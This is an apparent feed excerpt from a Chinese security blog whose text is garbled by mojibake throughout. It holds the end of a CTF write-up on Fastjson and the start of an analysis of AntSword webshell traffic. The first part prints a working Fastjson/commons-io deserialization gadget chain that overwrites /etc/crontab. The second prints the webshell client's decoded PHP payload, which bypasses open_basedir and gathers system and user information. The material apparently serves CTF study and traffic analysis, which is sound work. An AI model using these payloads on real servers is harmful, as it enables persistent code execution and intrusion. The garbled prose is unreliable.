aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"charsetName"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span>      <span class="token property">"bufferSize"</span><span class="token operator">:</span><span class="token number">1024</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"branch"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.output.WriterOutputStream"</span><span class="token punctuation">,</span>      <span class="token property">"writer"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.output.FileWriterWithEncoding"</span><span class="token punctuation">,</span>        <span class="token property">"file"</span><span class="token operator">:</span><span class="token string">"/etc/crontab"</span><span class="token punctuation">,</span>        <span class="token property">"encoding"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span>        <span class="token property">"append"</span><span class="token operator">:</span> <span class="token boolean">false</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"charset"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span>      <span class="token property">"bufferSize"</span><span class="token operator">:</span> <span class="token number">1024</span><span class="token punctuation">,</span>      <span class="token property">"writeImmediately"</span><span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"trigger"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.XmlStreamReader"</span><span class="token punctuation">,</span>      <span class="token property">"is"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.TeeInputStream"</span><span class="token punctuation">,</span>        <span class="token property">"input"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.input"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"branch"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.branch"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"closeBranch"</span><span class="token operator">:</span> <span class="token boolean">true</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"httpContentType"</span><span class="token operator">:</span><span class="token string">"text/xml"</span><span class="token punctuation">,</span>      <span class="token property">"lenient"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token property">"defaultEncoding"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"trigger2"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.XmlStreamReader"</span><span class="token punctuation">,</span>      <span class="token property">"is"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.TeeInputStream"</span><span class="token punctuation">,</span>        <span class="token property">"input"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.input"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"branch"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.branch"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"closeBranch"</span><span class="token operator">:</span> <span class="token boolean">true</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"httpContentType"</span><span class="token operator">:</span><span class="token string">"text/xml"</span><span class="token punctuation">,</span>      <span class="token property">"lenient"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token property">"defaultEncoding"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"trigger3"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.XmlStreamReader"</span><span class="token punctuation">,</span>      <span class="token property">"is"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.TeeInputStream"</span><span class="token punctuation">,</span>        <span class="token property">"input"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.input"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"branch"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>          <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.branch"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"closeBranch"</span><span class="token operator">:</span> <span class="token boolean">true</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"httpContentType"</span><span class="token operator">:</span><span class="token string">"text/xml"</span><span class="token punctuation">,</span>      <span class="token property">"lenient"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token property">"defaultEncoding"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¯”èµ›ç»“æŸä¹‹åé¶æœºå¥½åƒå°±æ‰“ä¸äº†è¿™ä¸ªäº†</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ—  pwn æ‰‹ä½œæˆ˜ï¼Œé—æ†¾ç¬¬ä¹&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/CCsdqEK_HOlE4eXj7QDEnQ&quot;&gt;https://mp.weixin.qq.com/s/CCsdqEK_HOlE4eXj7QDEnQ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/chuangfeimeiyigeren/eeii37/pyuic5kgzp3xe3tg&quot;&gt;https://www.yuque.com/chuangfeimeiyigeren/eeii37/pyuic5kgzp3xe3tg&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="FastJson" scheme="http://c1oudfl0w0.github.io/blog/tags/FastJson/"/>
    
  </entry>
  
  <entry>
    <title>WebShellåŠ å¯†æµé‡åˆ†æ</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2025-11-28T09:26:32.000Z</published>
    <updated>2026-02-05T07:45:10.796Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://www.freebuf.com/articles/web/264896.html">https://www.freebuf.com/articles/web/264896.html</a></p><p><a href="https://forum.butian.net/index.php/share/1996">https://forum.butian.net/index.php/share/1996</a></p><span id="more"></span><hr><h1 id="èšå‰‘æµé‡"><a href="#èšå‰‘æµé‡" class="headerlink" title="èšå‰‘æµé‡"></a>èšå‰‘æµé‡</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>php ä¸€å¥è¯ webshellï¼Œpost å‚æ•°ä¸º 0</p><p>è®¾ç½®èšå‰‘ä»£ç†åˆ° yakit ä¸ŠæŠ“åŒ…åˆ†æ</p><p>èšå‰‘é…ç½®ç¼–è§£ç å™¨</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251201110851050.png"></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="default-æµé‡"><a href="#default-æµé‡" class="headerlink" title="default æµé‡"></a>default æµé‡</h3><p>æŠ“å–æµ‹è¯•è¿æ¥çš„æ•°æ®åŒ…ï¼š</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251201111008478.png"></p><p>è§£ç è¯·æ±‚ä½“å¹¶æ ¼å¼åŒ–ï¼Œåˆ†æ </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// å…³é—­é”™è¯¯æ˜¾ç¤ºï¼Œé¿å…æš´éœ²ä¿¡æ¯</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è®¾ç½®è„šæœ¬æ‰§è¡Œæ—¶é—´æ— é™åˆ¶</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è·å–PHPçš„open_basediré™åˆ¶</span><span class="token variable">$opdir</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$opdir</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ocwd</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è§£ç base64å­—ç¬¦ä¸²";|:/"ï¼Œç”¨äºåˆ†å‰²open_basedirè·¯å¾„</span>    <span class="token variable">$oparr</span> <span class="token operator">=</span> <span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Lzt8Oi8="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$opdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å°†å½“å‰ç›®å½•å’Œä¸´æ—¶ç›®å½•æ·»åŠ åˆ°æ•°ç»„ä¸­</span>    @<span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$oparr</span><span class="token punctuation">,</span> <span class="token variable">$ocwd</span><span class="token punctuation">,</span> <span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// éå†æ‰€æœ‰ç›®å½•ï¼Œå°è¯•ç»•è¿‡open_basediré™åˆ¶</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$oparr</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// åˆ›å»ºä¸´æ—¶ç›®å½•ç”¨äºæµ‹è¯•</span>        <span class="token variable">$tmdir</span> <span class="token operator">=</span> <span class="token variable">$item</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/.e937733bd891"</span><span class="token punctuation">;</span>        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$tmdir</span> <span class="token operator">=</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è®¾ç½®open_basedirä¸ºä¸Šçº§ç›®å½•ï¼Œå°è¯•ç»•è¿‡é™åˆ¶</span>        @<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$cntarr</span> <span class="token operator">=</span> @<span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\//"</span><span class="token punctuation">,</span> <span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// é€šè¿‡å¤šæ¬¡chdir("..")å›åˆ°æ ¹ç›®å½•</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$cntarr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// æˆåŠŸç»•è¿‡åè®¾ç½®open_basedirä¸ºæ ¹ç›®å½•</span>        @<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        @<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// åŠ å¯†å‡½æ•°ï¼ˆdefaultä¸ºç©ºï¼‰</span><span class="token keyword">function</span> <span class="token function-definition function">asenc</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// è¾“å‡ºå‡½æ•°ï¼Œç”¨äºå°è£…è¿”å›æ•°æ®</span><span class="token keyword">function</span> <span class="token function-definition function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è¾“å‡ºå¼€å§‹æ ‡è®°</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ee69b"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"ffbe3"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> @<span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è¾“å‡ºç»“æŸæ ‡è®°</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"d7a1"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"8240"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// å¼€å§‹è¾“å‡ºç¼“å†²</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$D</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PATH_TRANSLATED"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$R</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$D</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>  <span class="token comment">// å½“å‰ç›®å½•</span>        <span class="token comment">// æ£€æµ‹ç³»ç»Ÿç±»å‹å’Œç£ç›˜</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Windowsç³»ç»Ÿï¼šæ£€æµ‹Cåˆ°Zç›˜</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Z"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$L</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$L</span><span class="token punctuation">&#125;</span></span>:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$R</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$L</span><span class="token punctuation">&#125;</span></span>:"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Linux/Unixç³»ç»Ÿï¼šæ ¹ç›®å½•</span>        <span class="token variable">$R</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$R</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token comment">// åˆ¶è¡¨ç¬¦åˆ†éš”</span>        <span class="token comment">// è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"posix_getegid"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> @<span class="token function">posix_getpwuid</span><span class="token punctuation">(</span>@<span class="token function">posix_geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$u</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> @<span class="token function">get_current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è·å–æ“ä½œç³»ç»Ÿä¿¡æ¯</span>    <span class="token variable">$R</span> <span class="token operator">.=</span> <span class="token function">php_uname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$R</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$s</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>  <span class="token comment">// ç”¨æˆ·å</span>        <span class="token keyword">echo</span> <span class="token variable">$R</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR://"</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 